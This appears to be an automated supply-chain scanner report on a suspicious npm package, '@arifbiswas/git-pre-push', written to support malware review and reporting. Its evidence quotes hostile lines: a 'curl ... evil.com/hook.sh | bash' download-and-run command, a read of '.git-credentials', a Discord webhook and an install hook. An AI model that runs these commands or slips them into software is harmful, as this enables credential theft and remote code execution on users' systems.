# Suspicious package report: `@arifbiswas/git-pre-push` 1.0.20 (npm)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `@arifbiswas/git-pre-push` |
| Version | `1.0.20` |
| Ecosystem | npm |
| Risk score | 100 / 100 (high) |
| Published | 2026-11-18T08:54:54Z |
| Scanned | 2026-11-19T09:32:29Z |
| Registry page | https://www.npmjs.com/package/@arifbiswas/git-pre-push/v/1.0.20 |

## Indicators

- **exfiltration** (high, +40): Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.

  Evidence in `package/src/vault.js`:

  ```text
  path.join(process.env.HOME || os.homedir(), '.git-credentials'),
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `package/src/menu.js`:

  ```text
  + curl -fsSL https://evil.com/hook.sh | bash
  ```

- **suspicious-endpoint** (medium, +30): Hardcoded Discord webhook in package code.

  Evidence in `package/bin/cli.js`:

  ```text
  + const webhook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";`;
  ```

- **npm-install-hook** (medium, +25): 'postinstall' script runs a bundled JavaScript file at install time.

  Evidence in `package.json`:

  ```text
  "postinstall": "node scripts/postinstall.js"
  ```

- **sparse-metadata** (info, +4): Missing or placeholder repository URL.

## Suggested text for an upstream report

The npm package `@arifbiswas/git-pre-push` version `1.0.20` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.
- Code downloads a file and then executes it or marks it executable.
- Hardcoded Discord webhook in package code.
- 'postinstall' script runs a bundled JavaScript file at install time.
- Missing or placeholder repository URL.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via https://www.npmjs.com/support (choose "Report malware"), or the "Report malware" link on the package page.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20npm%2F%40arifbiswas%2Fgit-pre-push%401.0.20&package=npm%2F%40arifbiswas%2Fgit-pre-push%401.0.20
